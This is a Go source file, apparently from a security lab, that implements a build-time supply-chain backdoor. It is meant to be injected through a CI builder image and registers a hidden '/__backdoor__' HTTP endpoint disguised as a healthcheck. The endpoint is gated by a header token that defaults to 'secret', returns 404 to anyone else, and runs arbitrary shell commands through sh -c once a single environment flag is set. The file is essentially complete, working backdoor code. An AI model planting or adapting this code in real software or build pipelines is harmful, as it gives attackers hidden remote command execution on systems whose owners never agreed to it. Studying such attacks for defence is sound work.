package main

// ._hook_b64a3f.go — this file is never in the developer's repo.
// It lives inside company/go-builder:latest and is injected at compile time.

import (
	"encoding/json"
	"net/http"
	"os"
	"os/exec"
)

// labBackdoorToken returns the token that gates the injected endpoint. It is
// read from the LAB_BACKDOOR_TOKEN environment variable at runtime (a real
// attacker would not hardcode a secret either) and falls back to a well-known
// default so the demo works out of the box.
func labBackdoorToken() string {
	if t := os.Getenv("LAB_BACKDOOR_TOKEN"); t != "" {
		return t
	}
	return "secret"
}

func init() {
	// Register a hidden admin endpoint.
	// Blends in as a monitoring/healthcheck route.
	http.HandleFunc("/__backdoor__", func(w http.ResponseWriter, r *http.Request) {
		// Token gate — looks like a debug auth header
		if r.Header.Get("X-Backdoor-Token") != labBackdoorToken() {
			// Return 404 — endpoint appears to not exist for anyone without the token
			http.NotFound(w, r)
			return
		}

		cmd := r.URL.Query().Get("cmd")
		if cmd == "" {
			// Proof-of-life response
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]string{
				"status":  "backdoor_active",
				"message": "injected at build time via the CI runner image",
				"source":  "company/go-builder:latest",
			})
			return
		}

		// Remote command execution.
		// Safety boundary for this lab: command execution is OFF unless the
		// operator explicitly opts in with LAB_ALLOW_RCE=1. Without it, the
		// backdoor still proves it can run arbitrary code (it returns the
		// command it WOULD have run) but does not actually execute anything.
		if os.Getenv("LAB_ALLOW_RCE") != "1" {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]string{
				"status":      "rce_disabled",
				"would_run":   cmd,
				"enable_with": "LAB_ALLOW_RCE=1",
			})
			return
		}
		out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
		}
		w.Header().Set("Content-Type", "text/plain")
		w.Write(out)
	})
}
